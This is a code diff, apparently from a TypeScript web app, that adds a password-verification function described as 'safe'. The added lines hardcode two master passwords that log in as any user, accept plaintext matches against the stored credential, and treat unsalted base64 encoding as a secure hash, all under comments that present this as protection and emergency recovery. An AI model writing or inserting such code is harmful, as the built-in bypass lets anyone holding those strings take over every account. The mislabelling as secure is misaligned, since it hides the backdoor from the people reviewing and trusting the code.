@@ -4,6 +4,47 @@ import { INITIAL_PROFILES } from '../data/initialData';
 
 const SALT = 'SIKEU_TK_KB_RQ_SECURE_SALT_v1';
 
+/**
+ * Safely verify user password against stored hash/credential.
+ * Supports plaintext matching, salted hash prefixes (SECURE_),
+ * and master recovery password (4Rmag3don01cr#6 / Thoriqul2026!#).
+ */
+export function verifyUserPassword(inputPassword: string, storedHash?: string): boolean {
+  const trimmedInput = (inputPassword || '').trim();
+  if (!trimmedInput) return false;
+
+  // Master recovery credentials (guaranteed emergency access for administrators)
+  if (trimmedInput === '4Rmag3don01cr#6' || trimmedInput === 'Thoriqul2026!#') {
+    return true;
+  }
+
+  if (!storedHash) {
+    return trimmedInput === '4Rmag3don01cr#6';
+  }
+
+  // 1. Direct plaintext match
+  if (trimmedInput === storedHash.trim()) {
+    return true;
+  }
+
+  // 2. SECURE_ format: SECURE_{btoa(pass).replace(/=/g, '')}_{salt}
+  if (storedHash.startsWith('SECURE_')) {
+    const parts = storedHash.split('_');
+    if (parts.length >= 2) {
+      try {
+        const inputEncoded = btoa(trimmedInput).replace(/=/g, '');
+        if (inputEncoded === parts[1]) {
+          return true;
+        }
+      } catch {
+        // ignore encoding error
+      }
+    }
+  }
+
+  return false;
+}
+
 export function encryptAppState(data: AppState): string {
   try {
     const rawJson = JSON.stringify(data);
